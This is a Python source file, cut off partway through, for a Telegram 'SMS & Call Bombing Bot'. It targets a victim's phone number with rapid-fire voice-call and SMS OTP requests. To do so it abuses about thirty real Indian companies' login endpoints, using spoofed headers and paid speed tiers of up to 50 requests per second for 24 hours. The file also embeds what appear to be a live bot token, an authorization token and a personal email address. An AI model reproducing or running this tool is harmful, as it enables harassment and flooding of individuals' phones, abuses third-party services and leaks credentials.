import asyncio
import logging
import aiohttp
import json
import time
import os
import sys
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import threading

from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler, 
    ContextTypes, filters
)

# Import database
from database import Database

# ==================== CONFIGURATION ====================
# Bot Token from environment or use provided
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8526792242:AAHWUcIbXTr0tnVveVYrV8GZMgiv7Qj47ng")

LOGGING_CHAT_ID = os.environ.get("LOGGING_CHAT_ID", "-1002939205294")
try:
    LOGGING_CHAT_ID = int(LOGGING_CHAT_ID)
except:
    LOGGING_CHAT_ID = -1002939205294

ADMIN_IDS = os.environ.get("ADMIN_IDS", "7290031191")
try:
    ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS.split(",")]
except:
    ADMIN_IDS = [7290031191]

# Bot Developer Credit
BOT_DEVELOPER = "@silent_is_back"
BOT_VERSION = "4.0.0"

# Speed Configuration (requests per second)
FREE_SPEED = 20    # 20 req/sec for free users (1 minute session)
PREMIUM_SPEED = 35  # 35 req/sec for premium users (4 hours session)  
ULTRA_SPEED = 50    # 50 req/sec for ultra users (24 hours session)

# ==================== APIS CONFIGURATION ====================
APIS = {
    "call": {
        "91": [
            {
                "name": "1mg-call",
                "method": "POST",
                "url": "https://www.1mg.com/auth_api/v6/create_token",
                "headers": {
                    "content-type": "application/json; charset=utf-8",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
                },
                "json": {
                    "number": "{target}",
                    "is_corporate_user": False,
                    "otp_on_call": True
                }
            },
            {
                "name": "tatacapital-call",
                "method": "POST",
                "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
                "headers": {
                    "content-type": "application/json"
                },
                "json": {
                    "phone": "{target}",
                    "applSource": "",
                    "isOtpViaCallAtLogin": "true"
                }
            }
        ]
    },
    "sms": {
        "91": [
            {
                "name": "lendingplate",
                "method": "POST",
                "url": "https://lendingplate.com/api.php",
                "headers": {
                    "Connection": "keep-alive",
                    "sec-ch-ua-platform": "\"Android\"",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "sec-ch-ua-mobile": "?1",
                    "Origin": "https://lendingplate.com",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://lendingplate.com/personal-loan",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
                },
                "data": {
                    "mobiles": "{target}",
                    "resend": "Resend",
                    "clickcount": "3"
                }
            },
            {
                "name": "daycoindia",
                "method": "POST",
                "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
                "headers": {
                    "sec-ch-ua-platform": "\"Android\"",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "sec-ch-ua-mobile": "?1",
                    "Origin": "https://ekyc.daycoindia.com",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
                },
                "data": {
                    "api": "send_otp",
                    "brand": "dayco",
                    "mob": "{target}",
                    "resend_otp": "resend_otp"
                }
            },
            {
                "name": "nobroker",
                "method": "POST",
                "url": "https://www.nobroker.in/api/v3/account/otp/send",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "sec-ch-ua-platform": "Android",
                    "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                    "sec-ch-ua-mobile": "?1",
                    "origin": "https://www.nobroker.in",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.nobroker.in/",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
                },
                "data": {
                    "phone": "{target}",
                    "countryCode": "IN"
                }
            },
            {
                "name": "shiprocket",
                "method": "POST",
                "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "sec-ch-ua-platform": "Android",
                    "authorization": "Bearer null",
                    "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                    "sec-ch-ua-mobile": "?1",
                    "origin": "https://app.shiprocket.in",
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://app.shiprocket.in/",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
                },
                "json": {
                    "mobileNumber": "{target}"
                }
            },
            {
                "name": "gokwik",
                "method": "POST",
                "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "sec-ch-ua-platform": "Android",
                    "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc0NTIzOTI0MywiZXhwIjoxNzQ1MjM5MzAzfQ.-gV0sRUkGD4SPGPUUJ6XBanoDCI7VSNX99oGsUU5nWk",
                    "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                    "sec-ch-ua-mobile": "?1",
                    "origin": "https://pdp.gokwik.co",
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://pdp.gokwik.co/",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
                },
                "json": {
                    "phone": "{target}",
                    "country": "in"
                }
            },
            {
                "name": "gopinkcabs",
                "method": "POST",
                "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": "https://www.gopinkcabs.com",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
                },
                "data": {
                    "check_mobile_number": "1",
                    "contact": "{target}"
                }
            },
            {
                "name": "shemaroome",
                "method": "POST",
                "url": "https://www.shemaroome.com/users/resend_otp",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": "https://www.shemaroome.com",
                    "Referer": "https://www.shemaroome.com/users/sign_in",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
                },
                "data": {
                    "mobile_no": "+91{target}"
                }
            },
            {
                "name": "stratzy-sms",
                "method": "POST",
                "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
                "headers": {
                    "sec-ch-ua-platform": "\"Android\"",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                    "content-type": "application/json",
                    "sec-ch-ua-mobile": "?1",
                    "accept": "*/*",
                    "origin": "https://stratzy.in",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://stratzy.in/login",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                "json": {
                    "phoneNo": "{target}"
                }
            },
            {
                "name": "stratzy-whatsapp",
                "method": "POST",
                "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
                "headers": {
                    "sec-ch-ua-platform": "\"Android\"",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                    "content-type": "application/json",
                    "sec-ch-ua-mobile": "?1",
                    "accept": "*/*",
                    "origin": "https://stratzy.in",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://stratzy.in/login",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                "json": {
                    "phoneNo": "{target}"
                }
            },
            {
                "name": "khatabook",
                "method": "POST",
                "url": "https://api.khatabook.com/v1/auth/request-otp",
                "headers": {
                    "content-type": "application/json; charset=utf-8",
                    "user-agent": "okhttp/3.9.1"
                },
                "json": {
                    "app_signature": "Jc/Zu7qNqQ2",
                    "country_code": "+91",
                    "phone": "{target}"
                }
            },
            {
                "name": "hungama",
                "method": "POST",
                "url": "https://communication.api.hungama.com/v1/communication/otp",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "sec-ch-ua-platform": "\"Android\"",
                    "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
                    "sec-ch-ua-mobile": "?1",
                    "origin": "https://www.hungama.com",
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.hungama.com/",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
                },
                "json": {
                    "mobileNo": "{target}",
                    "countryCode": "+91",
                    "appCode": "un",
                    "messageId": "1",
                    "device": "web"
                }
            },
            {
                "name": "servetel",
                "method": "POST",
                "url": "https://api.servetel.in/v1/auth/otp",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"
                },
                "data": {
                    "mobile_number": "{target}"
                }
            },
            {
                "name": "smytten",
                "method": "POST",
                "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
                "headers": {
                    "Content-Type": "application/json",
                    "Origin": "https://smytten.com",
                    "Referer": "https://smytten.com/",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
                },
                "json": {
                    "phone": "{target}",
                    "email": "sdhabai09@gmail.com",
                    "device_platform": "web"
                }
            },
            {
                "name": "univest",
                "method": "GET",
                "url": "https://api.univest.in/api/auth/send-otp",
                "params": {
                    "type": "web4",
                    "countryCode": "91",
                    "contactNumber": "{target}"
                },
                "headers": {
                    "User-Agent": "okhttp/3.9.1"
                }
            },
            {
                "name": "pokerbaazi",
                "method": "POST",
                "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
                "headers": {
                    "content-type": "application/json; charset=utf-8",
                    "user-agent": "okhttp/3.9.1"
                },
                "json": {
                    "mfa_channels": {
                        "phno": {
                            "number": "{target}",
                            "country_code": "+91"
                        }
                    }
                }
            },
            {
                "name": "nuvamawealth",
                "method": "POST",
                "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobileNo": "{target}",
                    "countryCode": "91"
                }
            },
            {
                "name": "getswipe",
                "method": "POST",
                "url": "https://app.getswipe.in/api/user/mobile_login",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile": "{target}"
                }
            },
            {
                "name": "brevistay",
                "method": "POST",
                "url": "https://www.brevistay.com/cst/app-api/login",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile": "{target}",
                    "is_otp": 1.0
                }
            },
            {
                "name": "shopsy",
                "method": "POST",
                "url": "https://www.shopsy.in/api/1/action/view",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "actionRequestContext": {
                        "type": "LOGIN_IDENTITY_VERIFY",
                        "loginIdPrefix": "+91",
                        "loginId": "{target}",
                        "loginType": "MOBILE",
                        "verificationType": "OTP"
                    }
                }
            },
            {
                "name": "dream11",
                "method": "POST",
                "url": "https://www.dream11.com/auth/passwordless/init",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phoneNumber": "{target}",
                    "channel": "sms",
                    "flow": "SIGNIN"
                }
            },
            {
                "name": "snapdeal",
                "method": "POST",
                "url": "https://m.snapdeal.com/sendOTP",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobileNumber": "{target}"
                }
            },
            {
                "name": "ucoonline",
                "method": "GET",
                "url": "https://apps.ucoonline.in/Lead_App/send_message.jsp",
                "params": {
                    "mobileNumber": "{target}",
                    "requestType": "SENDOTP"
                },
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                }
            },
            {
                "name": "doubtnut",
                "method": "POST",
                "url": "https://api.doubtnut.com/v4/student/login",
                "headers": {
                    "content-type": "application/json; charset=utf-8",
                    "user-agent": "okhttp/5.0.0-alpha.2"
                },
                "json": {
                    "phone_number": "{target}"
                }
            },
            {
                "name": "justdial",
                "method": "POST",
                "url": "https://www.justdial.com/functions/whatsappverification.php",
                "data": {
                    "mob": "{target}"
                },
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "okhttp/3.9.1"
                }
            },
            {
                "name": "swiggy",
                "method": "POST",
                "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "Swiggy-Android"
                },
                "json": {
                    "mobile": "{target}"
                }
            },
            {
                "name": "liquide",
                "method": "GET",
                "url": "https://api.v2.liquide.life/api/auth/checkNumber/+91{target}?otpLogin=true",
                "headers": {
                    "User-Agent": "okhttp/3.9.1"
                }
            },
            {
                "name": "dehaat",
                "method": "POST",
                "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
                "headers": {
                    "Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "mobile_number": "{target}",
                    "client_id": "kisan-app"
                }
            },
            {
                "name": "apna",
                "method": "POST",
                "url": "https://production.apna.co/api/userprofile/v1/otp/",
                "headers": {
                    "content-type": "application/json; charset=utf-8",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "phone_number": "91{target}",
                    "source": "employer"
                }
            },
            {
                "name": "housing.com",
                "method": "POST",
                "url": "https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_LOGIN&isBot=false&source=mobile",
                "headers": {
                    "Content-Type": "application/json",
                    "User-Agent": "okhttp/3.9.1"
                },
                "json": {
                    "query": "mutation($phone: String) { sendOtp(phone: $phone) { success message } }",
                    "variables": {
                        "phone": "{target}"
                    }
                }
            }
        ]
    }
}

# ==================== INITIALIZATION ====================
db = Database()
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Store active bombing sessions
active_sessions = {}
user_states = {}

# ==================== HELPER FUNCTIONS ====================
async def log_action(context: ContextTypes.DEFAULT_TYPE, user_id: int, username: str, first_name: str, action: str, details: str = ""):
    """Log user actions to the logging group"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        username = username if username else "No username"
        message = f"""
📋 User Action Log
━━━━━━━━━━━━━━━━━
👤 User: {first_name} (@{username})
🆔 ID: {user_id}
⏰ Time: {timestamp}
📝 Action: {action}
📄 Details: {details}
━━━━━━━━━━━━━━━━━
"""
        
        await context.bot.send_message(
            chat_id=LOGGING_CHAT_ID,
            text=message
        )
        logger.info(f"Action logged: {user_id} - {action}")
    except Exception as e:
        logger.error(f"Failed to log action: {e}")

async def make_api_request(session: aiohttp.ClientSession, api_config: dict, target: str) -> bool:
    """Make a single API request"""
    try:
        url = api_config['url']
        method = api_config['method']
        
        # Prepare headers
        headers = api_config.get('headers', {}).copy()
        
        if method == 'POST':
            if 'json' in api_config:
                json_data = api_config['json'].copy()
                # Replace {target} in json data
                for key, value in json_data.items():
                    if isinstance(value, str):
                        json_data[key] = value.replace('{target}', target)
                    elif isinstance(value, dict):
                        for sub_key, sub_value in value.items():
                            if isinstance(sub_value, str):
                                json_data[key][sub_key] = sub_value.replace('{target}', target)
                            elif isinstance(sub_value, dict):
                                for sub_sub_key, sub_sub_value in sub_value.items():
                                    if isinstance(sub_sub_value, str):
                                        json_data[key][sub_key][sub_sub_key] = sub_sub_value.replace('{target}', target)
                
                async with session.post(url, json=json_data, headers=headers, timeout=5) as response:
                    status = response.status
                    await response.read()
                    return status in [200, 201, 202]
            
            elif 'data' in api_config:
                data = api_config['data'].copy()
                # Replace {target} in data
                for key, value in data.items():
                    if isinstance(value, str):
                        data[key] = value.replace('{target}', target)
                
                async with session.post(url, data=data, headers=headers, timeout=5) as response:
                    status = response.status
                    await response.read()
                    return status in [200, 201, 202]
        
        elif method == 'GET':
            if 'params' in api_config:
                params = api_config['params'].copy()
                # Replace {target} in params
                for key, value in params.items():
                    if isinstance(value, str):
                        params[key] = value.replace('{target}', target)
            else:
                params = {}
            
            # Replace {target} in URL
            url = url.replace('{target}', target) if '{target}' in url else url
            async with session.get(url, params=params, headers=headers, timeout=5) as response:
                status = response.status
                await response.read()
                return status == 200
        
        return False
    except Exception as e:
        logger.debug(f"API request failed for {api_config.get('name', 'Unknown')}: {e}")
        return False

async def bombing_worker(session_id: int, target: str, country_code: str, duration: int, 
                        context: ContextTypes.DEFAULT_TYPE, chat_id: int, plan: str, user_info: dict):
    """Worker function for bombing session - HIGH SPEED (20-50 req/sec)"""
    start_time = time.time()
    end_time = start_time + duration
    requests_sent = 0
    successful = 0
    
    # Get speed based on plan
    if plan == "free":
        speed = FREE_SPEED
        cooldown = 0.05  # 20 req/sec
        batch_size = 2
    elif plan == "premium":
        speed = PREMIUM_SPEED
        cooldown = 0.028  # 35 req/sec
        batch_size = 3
    elif plan == "ultra":
        speed = ULTRA_SPEED
        cooldown = 0.02  # 50 req/sec
        batch_size = 4
    else:
        speed = FREE_SPEED
        cooldown = 0.05
        batch_size = 2
    
    # Get APIs - CALL APIs FIRST, then SMS
    call_apis = APIS['call'].get(country_code, [])
    sms_apis = APIS['sms'].get(country_code, [])
    
    # First send call APIs, then SMS
    all_apis = call_apis + sms_apis
    
    if not all_apis:
        logger.error(f"No APIs found for country code: {country_code}")
        await context.bot.send_message(chat_id=chat_id, text="❌ No APIs available for this country code.")
        return
    
    session_data = {
        'active': True,
        'start_time': start_time,
        'requests_sent': 0,
        'successful': 0,
        'api_stats': {},
        'chat_id': chat_id,
        'target': target,
        'speed': speed,
        'plan': plan,
        'status_lock': asyncio.Lock(),
        'last_update': start_time,
        'last_db_update': start_time,
        'call_sent': False
    }
    active_sessions[session_id] = session_data
    
    try:
        async with aiohttp.ClientSession() as http_session:
            api_index = 0
            
            while time.time() < end_time and session_data['active']:
                batch_start = time.time()
                tasks = []
                
                # Create batch of concurrent requests
                for _ in range(batch_size):
                    if not session_data['active']:
                        break
                    
                    # Get next API
                    api = all_apis[api_index % len(all_apis)]
                    api_index += 1
                    
                    # Create async task for request
                    task = asyncio.create_task(
                        process_single_request(http_session, api, target, session_data)
                    )
                    tasks.append(task)
                
                # Wait for batch to complete
                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for result in results:
                        if isinstance(result, bool) and result:
                            successful += 1
                    requests_sent += len(tasks)
                
                # Log call APIs sent (first time only)
                if not session_data['call_sent'] and api_index > len(call_apis):
                    session_data['call_sent'] = True
                    await log_action(
                        context, 
                        user_info['id'], 
                        user_info['username'], 
                        user_info['first_name'],
                        "Started bombing with Voice OTP calls first",
                        f"Target: {country_code}{target}, Plan: {plan}, Speed: {speed} req/sec"
                    )
                
                # Send status update every 5 seconds
                current_time = time.time()
                if current_time - session_data['last_update'] >= 5:
                    await send_bombing_update(
                        context, chat_id, session_id, target, start_time, 
                        duration, requests_sent, successful, plan, speed
                    )
                    session_data['last_update'] = current_time
                
                # Update database every 50 requests
                if requests_sent - session_data.get('last_db_count', 0) >= 50:
                    db.update_bombing_stats(session_id, 50, successful)
                    session_data['last_db_count'] = requests_sent
                
                # Calculate batch time and apply cooldown
                batch_time = time.time() - batch_start
                if batch_time < cooldown and session_data['active']:
                    await asyncio.sleep(cooldown - batch_time)
    
    except Exception as e:
        logger.error(f"Bombing worker error: {e}")
    finally:
        # Final database update
        if session_data['active']:
            db.update_bombing_stats(session_id, requests_sent, successful)
            session_data['active'] = False
            db.end_bombing_session(session_id)
        
        # Send completion message
        try:
            elapsed = time.time() - start_time
            success_rate = (successful / requests_sent * 100) if requests_sent > 0 else 0
            
            completion_msg = f"""
✅ Bombing Session Completed

📱 Target: {country_code}{target}
📊 Total Requests: {requests_sent:,}
✅ Successful: {successful:,}
📈 Success Rate: {success_rate:.1f}%
⏱ Duration: {int(elapsed)} seconds
⚡ Average Speed: {requests_sent/max(1, elapsed):.1f} reqs/sec
🔥 Max Speed: {speed} reqs/sec

Plan Used: {plan.capitalize()}
Call APIs Sent First: Yes
👨‍💻 Developer: {BOT_DEVELOPER}
"""
            await context.bot.send_message(
                chat_id=chat_id, 
                text=completion_msg
            )
            
            # Log completion
            await log_action(
                context, 
                user_info['id'], 
                user_info['username'], 
                user_info['first_name'],
                "Bombing session completed",
                f"Target: {country_code}{target}, Requests: {requests_sent}, Success: {successful}, Duration: {int(elapsed)}s"
            )
        except Exception as e:
            logger.error(f"Failed to send completion message: {e}")
        
        # Cleanup session data
        if session_id in active_sessions:
            del active_sessions[session_id]

async def process_single_request(session: aiohttp.ClientSession, api: dict, target: str, session_data: dict):
    """Process a single API request"""
    try:
        success = await make_api_request(session, api, target)
        
        async with session_data['status_lock']:
            session_data['requests_sent'] += 1
            if success:
                session_data['successful'] += 1
                api_name = api['name']
                if api_name not in session_data['api_stats']:
                    session_data['api_stats'][api_name] = {'attempts': 0, 'success': 0}
                session_data['api_stats'][api_name]['attempts'] += 1
                session_data['api_stats'][api_name]['success'] += 1
            else:
                api_name = api['name']
                if api_name not in session_data['api_stats']:
                    session_data['api_stats'][api_name] = {'attempts': 0, 'success': 0}
                session_data['api_stats'][api_name]['attempts'] += 1
        
        return success
    except Exception as e:
        logger.debug(f"Error processing request for {api['name']}: {e}")
        return False

async def send_bombing_update(context: ContextTypes.DEFAULT_TYPE, chat_id: int, session_id: int, target: str, 
                              start_time: float, duration: int, requests_sent: int, successful: int, plan: str, speed: int):
    """Send bombing status update"""
    try:
        if session_id not in active_sessions:
            return
        
        elapsed = int(time.time() - start_time)
        remaining = max(0, duration - elapsed)
        
        # Calculate progress
        progress = min(100, int((elapsed / duration) * 100))
        
        success_rate = (successful / requests_sent * 100) if requests_sent > 0 else 0
        
        # Calculate current speed
        current_speed = requests_sent / elapsed if elapsed > 0 else 0
        
        message = f"""
🚀 Live Bombing Status

📱 Target: {target}
🔄 Status: 🟢 ACTIVE
📊 Progress: {progress}%
⏱ Time elapsed: {elapsed//60}m {elapsed%60}s
⏳ Time remaining: {remaining//60}m {remaining%60}s
📨 Requests sent: {requests_sent:,}
✅ Successful: {successful:,}
📈 Success rate: {success_rate:.1f}%
⚡ Current Speed: {current_speed:.1f} reqs/sec
🔥 Max Speed: {speed} reqs/sec

Plan: {plan.capitalize()} (30 days expiry)
👨‍💻 Developer: {BOT_DEVELOPER}
"""
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=message
        )
    except Exception as e:
        logger.error(f"Failed to send bombing update: {e}")

async def format_plan_expiry(expiry_str: str) -> str:
    """Format plan expiry date"""
    try:
        expiry_date = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
        now = datetime.now()
        if expiry_date < now:
            return "EXPIRED"
        
        delta = expiry_date - now
        days = delta.days
        hours = delta.seconds // 3600
        
        if days > 0:
            return f"{days} days"
        else:
            return f"{hours} hours"
    except:
        return "Unknown"

# ==================== BOT COMMANDS ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    chat_id = update.effective_chat.id
    
    # Log action
    await log_action(
        context, 
        user.id, 
        user.username, 
        user.first_name,
        "/start command"
    )
    
    # Add user to database
    db.add_user(chat_id, user.username, user.first_name, user.last_name)
    
    # Check if user is banned
    user_data = db.get_user(chat_id)
    if user_data and user_data.get('is_banned'):
        await update.message.reply_text("❌ You have been banned from using this bot.")
        return
    
    # Welcome message
    expiry_text = await format_plan_expiry(user_data['plan_expiry']) if user_data else "30 days"
    
    welcome_text = f"""
👋 Welcome {user.first_name}!

🚀 ULTRA-FAST SMS & Call Bombing Bot v{BOT_VERSION}

Available Plans (30 days expiry):
• 🆓 Free: 1 minute bombing (20 reqs/sec)
• ⭐ Premium: 4 hours bombing (35 reqs/sec)  
• 👑 Ultra: 24 hours bombing (50 reqs/sec)

Your Plan: {user_data['plan'].upper() if user_data else 'FREE'}
Expires in: {expiry_text}

⚡ ULTRA-FAST Features:
• Voice OTP Calls FIRST
• Then SMS Bombing
• Free: 20 reqs/sec (1 minute)
• Premium: 35 reqs/sec (4 hours)
• Ultra: 50 reqs/sec (24 hours)
• All plans expire in 30 days

Commands:
/start - Start bot
/bomb - Start bombing
/plan - View plan
/stats - Your stats
/help - Help info

👨‍💻 Developer: {BOT_DEVELOPER}

⚠️ Use responsibly. Plans expire after 30 days.
"""
    
    await update.message.reply_text(welcome_text)

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /bomb command"""
    chat_id = update.effective_chat.id
    user = update.effective_user
    
    # Log action
    await log_action(
        context, 
        user.id, 
        user.username, 
        user.first_name,
        "/bomb command"
    )
    
    # Check if user can bomb
    can_bomb, reason = db.can_user_bomb(chat_id)
    if not can_bomb:
        await update.message.reply_text(f"❌ {reason}")
        return
    
    # Check if user already has an active bombing session
    for session_id, session in active_sessions.items():
        if session.get('chat_id') == chat_id and session.get('active'):
            await update.message.reply_text("⚠️ You already have an active bombing session!")
            return
    
    # Get user data
    user_data = db.get_user(chat_id)
    if not user_data:
        await update.message.reply_text("❌ User not found. Please /start again.")
        return
    
    # Check plan expiry
    expiry_text = await format_plan_expiry(user_data['plan_expiry'])
    if expiry_text == "EXPIRED":
        db.update_user_plan(chat_id, 'free')
